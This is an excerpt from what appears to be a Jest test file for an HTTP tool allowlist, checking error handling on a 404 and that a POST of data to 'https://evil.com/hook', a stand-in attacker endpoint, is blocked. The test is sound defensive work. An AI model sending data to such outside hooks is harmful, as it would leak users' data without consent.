...
describe('http.get allowlist', () => {
  ...
  it('throws on non-ok HTTP status', async () => {
    (global.fetch as jest.Mock).mockResolvedValueOnce({ ok: false, status: 404, headers: { get: () => 'application/json' } });
...
describe('http.post allowlist', () => {
  it('blocks non-allowlisted domains', async () => {
    await expect(httpTools['http.post']('https://evil.com/hook', { data: 'x' })).rejects.toThrow('not in allowlist');
  });
